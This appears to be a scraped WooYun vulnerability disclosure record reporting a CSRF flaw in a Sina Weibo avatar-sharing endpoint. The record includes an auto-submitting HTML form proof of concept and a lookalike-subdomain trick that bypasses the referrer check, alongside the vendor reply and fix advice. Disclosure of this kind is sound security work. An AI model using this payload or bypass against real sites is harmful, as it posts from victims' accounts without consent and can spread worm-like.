{"id": 73827, "wybug_id": "wooyun-2015-0164067", "wybug_title": "新浪微博CSRF之点我链接发微博（可蠕虫）", "wybug_corp": "新浪微博", "wybug_author": "zhchbin", "wybug_date": "2015-12-24 09:48", "wybug_open_date": "2016-02-06 10:45", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["类型应用", "蠕虫", "防护策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述： 求个高分！求个礼物！还是绕过referrer的问题。 详细说明：  接口：\nhttp://game.weibo.com/avatar/interface/shareAvatar\n有检查referrer，但是可以用app.wcdn.cn.*.*类似的域名绕过。测试代码：\n<form action=\"http://game.weibo.com/avatar/interface/shareAvatar\" method=\"post\"> <input type=\"text\" name=\"content\" value=\"Hi, testing http://app.wcdn.cn.zhchbin.xyz/\" /> <input type=\"text\" name=\"image\" value=\"\" /> <script> document.forms[0].submit(); </script> </form>\n   漏洞证明：  浏览器登录微博后，点开这个链接：\nhttp://app.wcdn.cn.zhchbin.xyz/\n然后就可以看到：\n\n\n\n   修复方案：  修复referrer的验证   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-24 10:57 厂商回复： 感谢支持，已经联系相关业务修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-24 10:06 |    \t\tYuku \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:19        | 酱油哥)\t\t \n  这么6.怎么绕的。xxx.weibo.com.xx.com？    \n     2015-12-24 11:04 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @Yuku bingo@新浪微博 难道是所有有危害的CSRF问题都是5分？哎。。这5分给的。。。    \n     2015-12-24 11:06 |    \t\tYuku \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:19        | 酱油哥)\t\t \n  应急挺迅速~    \n     2015-12-24 12:26 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:25        | ../)\t\t \n  挺6啊    \n     2016-01-13 22:55 |    \t\tYsql404 \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:66        | 碧海情天)\t\t \n  为什么能通过app.wcdn.cn.*.*类似的域名绕过，能解释下吗    \n     2016-01-13 23:15 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  Ysql404 就是他们检查referer的代码逻辑写错了。比如只检查了referer是不是以字符串\"http://app.wcdn.cn\"开头，这样子就可以绕过了，因为可以在自己的域名下加多个子域名，这样子referer就符合他们的检查，然后就绕过了。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}